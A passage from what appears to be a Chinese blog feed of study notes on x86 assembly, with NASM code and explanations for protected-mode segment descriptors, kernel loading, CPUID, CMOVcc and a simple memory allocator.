<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/609e6f5a2b3b335d37cfc7ebdd66a3ab.png" class="">

<p>使用下列指令执行压栈操作:</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/4c5d56edda424f8df68ea1ca6ab0198f.png" class="">
<p>在执行压栈指令时, 需要对压入的数据进行检查, 以确定不会超出段的界限:</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/1d603df7aad64f9f9229d01c24dec8ef.png" class="">
<p>具体为处理器先执行<mark>ESP - 4 = 0xFFFFFFFC</mark>, 0xFFFFFFFC &gt; 实际使用的段界限<mark>0xFFFFEFFF</mark>, 符合上述条件执行压栈操作. </p>
<p>接下来处理器使用段的基地址<mark>0x00007C00 + 0xFFFFFFFC = 0x00007BFC</mark>, 从这里写入数据.</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/68e0568c6fec5a195b57dbbf16cff16c.png" class="">
<p>压栈后执行出栈操作</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/e2b58c0ed6456f11f738e4b8750a63ee.png" class="">
<p>出栈:</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/1bc297a853f54a8a2bb0571e725d96c9.png" class="">

<h2 id="10-通过别名来实现段的共用和共享"><a href="#10-通过别名来实现段的共用和共享" class="headerlink" title="10. 通过别名来实现段的共用和共享"></a>10. 通过别名来实现段的共用和共享</h2><p>在保护模式下不能使用<mark>CS</mark>来修改内存, 但是可以设置一个代码段的别名描述符, 将其<mark>X位</mark>设置为0表示数据段, 这样就可以通过<mark>ES</mark>来访问字符串所在的内存位置, 以达到修改内存的操作.</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/e180b2058d4d9b11287f912eff746810.png" class="">

<h2 id="11-冒泡排序的基本原理"><a href="#11-冒泡排序的基本原理" class="headerlink" title="11. 冒泡排序的基本原理"></a>11. 冒泡排序的基本原理</h2><img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/b2e5460885bf9342412d042119339c1c.png" class="">

<h2 id="12-32位操作尺寸下的LOOP指令"><a href="#12-32位操作尺寸下的LOOP指令" class="headerlink" title="12. 32位操作尺寸下的LOOP指令"></a>12. 32位操作尺寸下的LOOP指令</h2><p>如果<mark>CS</mark>高速缓存器中的<mark>D位为0</mark>表示使用16位操作尺寸, <mark>loop</mark>指令使用<mark>cx</mark>计数, 如果<mark>D=1</mark>那么表示使用32位操作尺寸, <mark>loop</mark>使用<mark>ecx</mark>计数.<br>冒泡排序循环:@@1处</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/0d588a106bd54741185f3e6945c1fa73.png" class="">

<p>冒泡排序内循环: @@2处</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/390dc92a8ce50d36c122e217c6b526f7.png" class="">

<p>其中外循环比较次数: 可以看出内循环比较次数和外循环的<mark>ECX</mark>相同</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/6e3b915f0449d48ab3a7a5e202898502.png" class="">

<p>冒泡内循环比较过程:</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/ec0258efab5eb24c7d5d9328f7f60598.png" class="">

<h2 id="13-数据交换指令XCHG"><a href="#13-数据交换指令XCHG" class="headerlink" title="13. 数据交换指令XCHG"></a>13. 数据交换指令XCHG</h2><p><mark>XCHG</mark>指令: 操作数不能同时为内存地址</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/image-20221113170928597.png" class="" title="image-20221113170928597">
]]></content>
      <categories>
        <category>X86汇编：实模式到保护模式</category>
      </categories>
      <tags>
        <tag>X86存储器及其保护</tag>
      </tags>
  </entry>
  <entry>
    <title>保护模式程序的动态加载和执行</title>
    <url>/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h2 id="01-本章的目标和内容提要"><a href="#01-本章的目标和内容提要" class="headerlink" title="01. 本章的目标和内容提要"></a>01. 本章的目标和内容提要</h2><p>引入保护模式、描述符、描述符表等并没有对用户程序的编写增加什么负担</p>
<ul>
<li>因为对于系统来说这些是必须的，对于运行在系统上的程序来说不需要关心这些</li>
</ul>
<span id="more"></span>

<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/9bb28704b96ba84ebdd5cd6715a3c693.png" class="">

<h2 id="02-内核的结构和加载前的准备工作"><a href="#02-内核的结构和加载前的准备工作" class="headerlink" title="02. 内核的结构和加载前的准备工作"></a>02. 内核的结构和加载前的准备工作</h2><p>内核的加载包含<mark>c13_mbr.asm</mark>全部和<mark>c13_core. asm</mark>一小部分<br><strong>c13_mbr.asm</strong>用于：</p>
<ul>
<li>从BIOS中接管处理器以及硬件的控制权</li>
<li>安装最基本的段描述符</li>
<li>初始化最初的执行环境</li>
<li>然后从硬盘上读取和加载内核的剩余部分</li>
<li>创建组成内核的每一个内存段</li>
</ul>
<p><strong>c13_core.asm</strong>中定义的内核的分段信息：</p>
<ul>
<li>第一个分段：内核的头部，用于记录内核总长度，每个段的相对位置、以及入口点信息，以上统计信息用于告诉初始化代码如何加载内核；</li>
<li>第二个分段：公共例程段，本质上是一个代码段，包括一些可以反复使用的子过程，比如显示字符串例程、硬盘读写例程、内存分配例程、描述符创建和安装例程。这些子过程可以为内核自己使用也可以提供给用户程序使用；</li>
<li>第三个分段：数据段，包括系统核心数据，供内核自己使用；</li>
<li>第四个分段：代码段，包含进入内核之后首先要执行的代码、以及用于内存分配、读取和加载用户程序、控制用户程序的代码。</li>
</ul>
<h2 id="03-准备为内核的每个段创建和安装描述符"><a href="#03-准备为内核的每个段创建和安装描述符" class="headerlink" title="03. 准备为内核的每个段创建和安装描述符"></a>03. 准备为内核的每个段创建和安装描述符</h2><p>上一节中已经将内核全部读入内存， 这一节是找到内核的每一个段为他们创建并安装描述符。在保护模式下，内核访问自己的段也需要通过描述符。</p>
<p>内核的段描述符安装在<mark>GDT</mark>中，之前已经使用<mark>lgdt</mark>指令加载了<mark>GDTR</mark>，在这里我们就需要为<mark>GDT</mark>安装新的描述符。那我们的任务就是从标号<mark>pgdt</mark>处取得<mark>GDT</mark>的基地址，为其添加新的描述符，并修改新的界限值，之后使用<mark>lgdt</mark>指令再次加载<mark>GDTR</mark>使其生效。</p>
<p>但是，现在程序处于保护模式，对代码段的保护导致不能通过<mark>代码段描述符</mark>来修改代码段中的内容。但是可以使用占全部4G空间的数据段描述符（或者创建代码段的别名描述符）来修改与代码段重叠部分的内容。</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/1fa11bf5789cca5df597cba02705eafa.png" class="">
<p>如图所示：大括号是4G字节的数据段、小括号是现在主引导程序所在的代码段，两个段有重叠的部分。</p>
<p>问：内核代码段的描述符还没有创建和安装，如何知道器选择子是什么？<br>答：内核常驻内存地址不会改变，内核在加载自己时会提前规划好每个段描述符的没醒，以及他们在描述符表中的位置，这样一来就知道每个段选择子的具体数值，因此为了方便可以将每个段的选择子定义为常数。<br>此时的内存布局：</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/bb79369a945668586c907eff40be4df8.png" class="">

<h2 id="04-段描述符的创建和BSWAP指令"><a href="#04-段描述符的创建和BSWAP指令" class="headerlink" title="04. 段描述符的创建和BSWAP指令"></a>04. 段描述符的创建和BSWAP指令</h2><p>本节使用到的代码片段：<br><mark>c13_mbr.asm</mark></p>
<pre><code>setup:
         mov esi,[0x7c00+pgdt+0x02]         ;不可以在代码段内寻址pgdt，但可以
                                            ;通过4GB的段来访问
         ;建立公用例程段描述符
         mov eax,[edi+0x04]                 ;公用例程代码段起始汇编地址
         mov ebx,[edi+0x08]                 ;核心数据段汇编地址
         sub ebx,eax
         dec ebx                            ;公用例程段界限 
         add eax,edi                        ;公用例程段基地址
         mov ecx,0x00409800                 ;字节粒度的代码段描述符
         call make_gdt_descriptor
         mov [esi+0x28],eax
         mov [esi+0x2c],edx 
</code></pre>
<p><mark>c13_core.asm</mark></p>
<pre><code>make_seg_descriptor:                        ;构造存储器和系统的段描述符
                                            ;输入：EAX=线性基地址
                                            ;      EBX=段界限
                                            ;      ECX=属性。各属性位都在原始
                                            ;          位置，无关的位清零 
                                            ;返回：EDX:EAX=描述符
         mov edx,eax
         shl eax,16
         or ax,bx                           ;描述符前32位(EAX)构造完毕

         and edx,0xffff0000                 ;清除基地址中无关的位
         rol edx,8
         bswap edx                          ;装配基址的31~24和23~16  (80486+)

         xor bx,bx
         or edx,ebx                         ;装配段界限的高4位

         or edx,ecx                         ;装配属性

         retf 
</code></pre>
<p>内存布局如下，使用的是4G字节的数据段从0开始，那么公共例程段的逻辑地址就等于<mark>EDI</mark>指定的地址。</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/b0486969de5d713ba29775fe980d06fd.png" class="">

<p>使用<mark>make_gdt_descriptor</mark>子程序构造描述符的低32位：</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/72752de04c5902657684c80fe03e60d4.png" class="">

<p>高32位的基地址部分：</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/53951340edc787f76dad35ab5b8028c6.png" class="">

<p>数据反转指令：</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/8e19731756b24be358680fb326a7e15d.png" class="">

<p>将32位寄存器分成四个八位头尾反转，中间相邻反转：</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/07bfd474ab406622ec6744724c74846d.png" class="">

<p>高32位的<mark>段界限</mark>部分：</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/ca7c9e31c5f3d321a4ea2243ef708dac.png" class="">


<h2 id="05-进入内核执行"><a href="#05-进入内核执行" class="headerlink" title="05. 进入内核执行"></a>05. 进入内核执行</h2><p>本节用到的代码片段：</p>
<pre><code>         ;建立核心数据段描述符
         mov eax,[edi+0x08]                 ;核心数据段起始汇编地址
         mov ebx,[edi+0x0c]                 ;核心代码段汇编地址 
         sub ebx,eax
         dec ebx                            ;核心数据段界限
         add eax,edi                        ;核心数据段基地址
         mov ecx,0x00409200                 ;字节粒度的数据段描述符 
         call make_gdt_descriptor
         mov [esi+0x30],eax
         mov [esi+0x34],edx 
      
         ;建立核心代码段描述符
         mov eax,[edi+0x0c]                 ;核心代码段起始汇编地址
         mov ebx,[edi+0x00]                 ;程序总长度
         sub ebx,eax
         dec ebx                            ;核心代码段界限
         add eax,edi                        ;核心代码段基地址
         mov ecx,0x00409800                 ;字节粒度的代码段描述符
         call make_gdt_descriptor
         mov [esi+0x38],eax
         mov [esi+0x3c],edx

         mov word [0x7c00+pgdt],63          ;描述符表的界限
                                        
         lgdt [0x7c00+pgdt]                  

         jmp far [edi+0x10]
</code></pre>
<p>内核加载之后的<mark>GDT</mark>布局：</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/24a4d1969cb1dce52429158938f30178.png" class="">

<p>4G字节字段内存布局：</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/06ac92012b3feaf193f6590e8e96669e.png" class="">
<p>执行<mark>jmp far[edi+0x10]</mark> 指令时：处理器使用 <mark>DS描述符高速缓存器中的基地址0</mark> 加上 <mark>[edi+0x10]生成的有效偏移地址</mark> 得到内存中的线性地址去访问内存取出<font color="#00ffff" size="3">32位段内偏移</font>和 <mark>16位段选择子</mark>，然后用<mark>段选择子</mark>到<mark>GDT</mark>中取出对应的<mark>段描述符</mark>在经过检查后放入<mark>CS描述符高速缓存器</mark>中，同时将<font color="#00ffff" size="3">32位段内偏移</font>传送到<font color="#00ffff" size="3">EIP</font>，之后处理器使用<mark>CS描述符高速缓存器</mark>中的<mark>段基地址</mark>加上<font color="#00ffff" size="3">EIP</font>中的偏移作为逻辑地址去执行指令，即到内核入口点取指令并执行。</p>
<h2 id="06-进入内核之后显示文本"><a href="#06-进入内核之后显示文本" class="headerlink" title="06. 进入内核之后显示文本"></a>06. 进入内核之后显示文本</h2><p>进入内核之后显示文本信息，本节代码：</p>
<pre><code>SECTION sys_routine vstart=0                ;系统公共例程代码段 
;-------------------------------------------------------------------------------
         ;字符串显示例程
put_string:                                 ;显示0终止的字符串并移动光标 
                                            ;输入：DS:EBX=串地址
         push ecx
  .getc:
         mov cl,[ebx]
         or cl,cl
         jz .exit
         call put_char
         inc ebx
         jmp .getc

  .exit:
         pop ecx
         retf                               ;段间返回

;-------------------------------------------------------------------------------
put_char:                                   ;在当前光标处显示一个字符,并推进
                                            ;光标。仅用于段内调用 
                                            ;输入：CL=字符ASCII码 
         pushad

         ;以下取当前光标位置
         mov dx,0x3d4
         mov al,0x0e
         out dx,al
         inc dx                             ;0x3d5
         in al,dx                           ;高字
         mov ah,al

         dec dx                             ;0x3d4
         mov al,0x0f
         out dx,al
         inc dx                             ;0x3d5
         in al,dx                           ;低字
         mov bx,ax                          ;BX=代表光标位置的16位数

         cmp cl,0x0d                        ;回车符？
         jnz .put_0a
         mov ax,bx
         mov bl,80
         div bl
         mul bl
         mov bx,ax
         jmp .set_cursor

  .put_0a:
         cmp cl,0x0a                        ;换行符？
         jnz .put_other
         add bx,80
         jmp .roll_screen

  .put_other:                               ;正常显示字符
         push es
         mov eax,video_ram_seg_sel          ;0xb8000段的选择子
         mov es,eax
         shl bx,1
         mov [es:bx],cl
         pop es

         ;以下将光标位置推进一个字符
         shr bx,1
         inc bx

  .roll_screen:
         cmp bx,2000                        ;光标超出屏幕？滚屏
         jl .set_cursor

         push ds
         push es
         mov eax,video_ram_seg_sel
         mov ds,eax
         mov es,eax
         cld
         mov esi,0xa0                       ;小心！32位模式下movsb/w/d 
         mov edi,0x00                       ;使用的是esi/edi/ecx 
         mov ecx,1920
         rep movsd
         mov bx,3840                        ;清除屏幕最底一行
         mov ecx,80                         ;32位程序应该使用ECX
  .cls:
         mov word[es:bx],0x0720
         add bx,2
         loop .cls

         pop es
         pop ds

         mov bx,1920

  .set_cursor:
         mov dx,0x3d4
         mov al,0x0e
         out dx,al
         inc dx                             ;0x3d5
         mov al,bh
         out dx,al
         dec dx                             ;0x3d4
         mov al,0x0f
         out dx,al
         inc dx                             ;0x3d5
         mov al,bl
         out dx,al

         popad
         ret   
</code></pre>
<pre><code>start:
         mov ecx,core_data_seg_sel           ;使ds指向核心数据段 
         mov ds,ecx

         mov ebx,message_1
         call sys_routine_seg_sel:put_string 
</code></pre>
<p>进入<mark>start</mark>标号之后，先将内核自己的数据段选择子<mark>core_data_seg_sel</mark>传送给<mark>DS</mark>，之后将文本信息的标号<mark>message_1</mark>传送给<mark>ebx</mark>，之后使用<mark>call</mark>指令进行过程调用，处理器将段寄存器<mark>CS</mark>和指令指针寄存器<mark>EIP(下一条指令的有效地址)</mark>进行压栈保存，使用指令中的系统公共例程代码段的选择子<mark>sys_routine_seg_sel</mark>取得描述符，经过检查之后加载到<mark>CS描述符高速缓存器</mark>，同时使用指令中的偏移量<mark>put_string</mark>改变指令指针寄存器<mark>EIP</mark>，这样就转到目标过程内部执行。</p>
<p>其中<mark>movsd</mark>指令的操作和当前默认操作尺寸相关：<br>    1. 当前操作尺寸是16位，源操作数由<mark>DS:SI</mark>指定、目的操作数由<mark>ES:DI</mark>指定；<br>    2. 当前操作尺寸是32位，源操作数由<mark>DS:ESI</mark>指定、目的操作数由<mark>ES:EDI</mark>指定；<br>    且由于当前是在32位操作尺寸下，所以重复传送的次数由<mark>ECX</mark>指定。</p>
<h2 id="07-用CPUID指令显示处理器品牌信息并显示"><a href="#07-用CPUID指令显示处理器品牌信息并显示" class="headerlink" title="07. 用CPUID指令显示处理器品牌信息并显示"></a>07. 用CPUID指令显示处理器品牌信息并显示</h2><p><mark>cpuid(CPU identification)</mark>指令用于返回处理器的标识和特性信息，需要使用<mark>EAX</mark>指定要返回什么样的信息，指定功能号。</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/cced9754233b346a0965ffc53d66187c.png" class="">

<p><mark>cpuid</mark>指令是在<mark>80486</mark>后期版本引入，在执行<mark>cpuid</mark>指令之前要检测处理器是否支持该指令：</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/5e72268ea5185704e17458c5ff490729.png" class="">
<p><mark>EFLAGS</mark>的位21是ID位，为0表示不支持cpuid指令，为1表示支持cpuid指令<br>本节代码：</p>
<pre><code class="assembly">         cpu_brnd0        db 0x0d,0x0a,'  ',0
         cpu_brand  times 52 db 0
         cpu_brnd1        db 0x0d,0x0a,0x0d,0x0a,0
</code></pre>
<pre><code class="assembly">                        ;显示处理器品牌信息 
         mov eax,0x80000002
         cpuid
         mov [cpu_brand + 0x00],eax
         mov [cpu_brand + 0x04],ebx
         mov [cpu_brand + 0x08],ecx
         mov [cpu_brand + 0x0c],edx
      
         mov eax,0x80000003
         cpuid
         mov [cpu_brand + 0x10],eax
         mov [cpu_brand + 0x14],ebx
         mov [cpu_brand + 0x18],ecx
         mov [cpu_brand + 0x1c],edx

         mov eax,0x80000004
         cpuid
         mov [cpu_brand + 0x20],eax
         mov [cpu_brand + 0x24],ebx
         mov [cpu_brand + 0x28],ecx
         mov [cpu_brand + 0x2c],edx

         mov ebx,cpu_brnd0
         call sys_routine_seg_sel:put_string
         mov ebx,cpu_brand
         call sys_routine_seg_sel:put_string
         mov ebx,cpu_brnd1
         call sys_routine_seg_sel:put_string 
</code></pre>
<h2 id="08-准备加载用户程序"><a href="#08-准备加载用户程序" class="headerlink" title="08. 准备加载用户程序"></a>08. 准备加载用户程序</h2><p>接上一节，加载用户程序：</p>
<pre><code class="assembly">         mov ebx,message_5
         call sys_routine_seg_sel:put_string
         mov esi,50                          ;用户程序位于逻辑50扇区 
         call load_relocate_program
</code></pre>
<pre><code class="assembly">SECTION header vstart=0

         program_length   dd program_end          ;程序总长度#0x00
         
         head_len         dd header_end           ;程序头部的长度#0x04

         stack_seg        dd 0                    ;用于接收堆栈段选择子#0x08
         stack_len        dd 1                    ;程序建议的堆栈大小#0x0c
                                                  ;以4KB为单位
                                                  
         prgentry         dd start                ;程序入口#0x10 
         code_seg         dd section.code.start   ;代码段位置#0x14
         code_len         dd code_end             ;代码段长度#0x18

         data_seg         dd section.data.start   ;数据段位置#0x1c
         data_len         dd data_end             ;数据段长度#0x20 
</code></pre>
<p>主要讲了用户程序的构造，由哪些部分组成起始和结束地址在哪，具体代码看c13.asm</p>
<h2 id="09-预读用户程序并得到它的大小"><a href="#09-预读用户程序并得到它的大小" class="headerlink" title="09. 预读用户程序并得到它的大小"></a>09. 预读用户程序并得到它的大小</h2><p>内容：读取用户程序的第一个扇区，取得用户程序的长度</p>
<pre><code class="assembly">SECTION core_code vstart=0
;-------------------------------------------------------------------------------
load_relocate_program:                      ;加载并重定位用户程序
                                            ;输入：ESI=起始逻辑扇区号
                                            ;返回：AX=指向用户程序头部的选择子 
         push ebx
         push ecx
         push edx
         push esi
         push edi
      
         push ds
         push es
      
         mov eax,core_data_seg_sel
         mov ds,eax                         ;切换DS到内核数据段
       
         mov eax,esi                        ;读取程序头部数据 
         mov ebx,core_buf                        
         call sys_routine_seg_sel:read_hard_disk_0 
</code></pre>
<h2 id="10-条件传送簇CMOVcc"><a href="#10-条件传送簇CMOVcc" class="headerlink" title="10. 条件传送簇CMOVcc"></a>10. 条件传送簇CMOVcc</h2><p><mark>mov</mark>指令传统方式：会影响流水线效率，因为条件转移指令发生就会使流水线编译的译码失效需要重新编译，虽然现代处理器有了分支预测技术但是分支预测并不总是对的。</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/0d699825616fb370b99fdac1f9689859.png" class="">

<p>使用<mark>CMOVcc</mark>指令简化传送指令：<mark>ne</mark>表示<mark>Not Equal</mark></p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/a37067392ac8d6dba19b384c333b109c.png" class="">

<p>Intel手册中有<mark>CMOV</mark>指令文档</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/0b088096f037a5b3383b83b003e3ca11.png" class="">

<p><mark>CMOV</mark>指令格式</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/0671b8c5bff812d609716ade0c2bd572.png" class="">

<p>条件传送指令是从<mark>P6处理器</mark>开始引入的，使用<mark>1</mark>功能号通过查看<mark>EDX</mark>的返回值可以查看处理器是否支持这个指令簇</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/826acaeec0d57740394d8a9bb0052db9.png" class="">


<h2 id="11-计算以512字节为单位的用户程序总长度"><a href="#11-计算以512字节为单位的用户程序总长度" class="headerlink" title="11. 计算以512字节为单位的用户程序总长度"></a>11. 计算以512字节为单位的用户程序总长度</h2><p>在二进制中，512整数倍的数，低9位均为0。</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/4dfe3bf8b2ce32811fa15da1fe42f3a5.png" class="">

<p>判断用户程序的大小是否为<mark>512</mark>的整倍数</p>
<pre><code class="assembly">         ;以下判断整个程序有多大
         mov eax,[core_buf]                 ;程序尺寸
         mov ebx,eax
         and ebx,0xfffffe00                 ;使之512字节对齐（能被512整除的数， 
         add ebx,512                        ;低9位都为0 
         test eax,0x000001ff                ;程序的大小正好是512的倍数吗? 
         cmovnz eax,ebx                     ;不是。使用凑整的结果 
</code></pre>
<h2 id="12-内存分配的基本策略和方法"><a href="#12-内存分配的基本策略和方法" class="headerlink" title="12. 内存分配的基本策略和方法"></a>12. 内存分配的基本策略和方法</h2><p> 操作系统必须记录所有可以分配的物理内存，当一个程序要求分配内存时，内存管理程序从可分配的内存中切割出一段将其标记为已使用。已分配内存在使用之后还需要负责回收它们，将其标记为空闲以便再次分配。</p>
<p> 当内存空间紧张时，内存管理程序还需要查找那些很久未使用的程序，将其移出到硬盘上，腾出空间给需要使用内存的程序使用。下次用到这些内存时再将其加载到内存中。这就是<mark>虚拟内存管理</mark>。</p>
<p> 现在的内存布局：<br> <img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/4e008d4175628203a066130d057cce66.png" class=""></p>
<p> 若一次分配<mark>512</mark>字节内存，从<mark>0x00100000</mark>处开始分配，则下一次从<mark>0x00100200</mark>处开始继续分配。<br> <img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/04ac4b9bbf72aa3bf7d650f4b83b071f.png" class=""></p>
<h2 id="13-内存分配的简易实现过程"><a href="#13-内存分配的简易实现过程" class="headerlink" title="13. 内存分配的简易实现过程"></a>13. 内存分配的简易实现过程</h2><p> 本节代码：</p>
<pre><code class="assembly">allocate_memory:                            ;分配内存
                                           ;输入：ECX=希望分配的字节数
                                           ;输出：ECX=起始线性地址 
        push ds
        push eax
        push ebx
     
        mov eax,core_data_seg_sel
        mov ds,eax
     
        mov eax,[ram_alloc]
        add eax,ecx                        ;下一次分配时的起始地址
     
        ;这里应当有检测可用内存数量的指令
         
        mov ecx,[ram_alloc]                ;返回分配的起始地址

        mov ebx,eax
        and ebx,0xfffffffc
        add ebx,4                          ;强制对齐 
        test eax,0x00000003                ;下次分配的起始地址最好是4字节对齐
        cmovnz eax,ebx                     ;如果没有对齐，则强制对齐 
        mov [ram_alloc],eax                ;下次从该地址分配内存
                                           ;cmovcc指令可以避免控制转移 
        pop ebx
        pop eax
        pop ds

        retf             
</code></pre>
<h2 id="14-加载用户程序"><a href="#14-加载用户程序" class="headerlink" title="14. 加载用户程序"></a>14. 加载用户程序</h2><p> 本节代码：</p>
<pre><code class="assembly">         mov ecx,eax                        ;实际需要申请的内存数量
        call sys_routine_seg_sel:allocate_memory
        mov ebx,ecx                        ;ebx -&gt; 申请到的内存首地址
        push ebx                           ;保存该首地址 
        xor edx,edx
        mov ecx,512
        div ecx
        mov ecx,eax                        ;总扇区数 
     
        mov eax,mem_0_4_gb_seg_sel         ;切换DS到0-4GB的段
        mov ds,eax

        mov eax,esi                        ;起始扇区号 
 .b1:
        call sys_routine_seg_sel:read_hard_disk_0
        inc eax
        loop .b1
</code></pre>
<h2 id="15-准备安装用户程序的段描述符"><a href="#15-准备安装用户程序的段描述符" class="headerlink" title="15. 准备安装用户程序的段描述符"></a>15. 准备安装用户程序的段描述符</h2><p> 本节代码：</p>
<pre><code class="assembly">        ;建立程序头部段描述符
       pop edi                            ;恢复程序装载的首地址 
       mov eax,edi                        ;程序头部起始线性地址
       mov ebx,[edi+0x04]                 ;段长度
       dec ebx                            ;段界限 
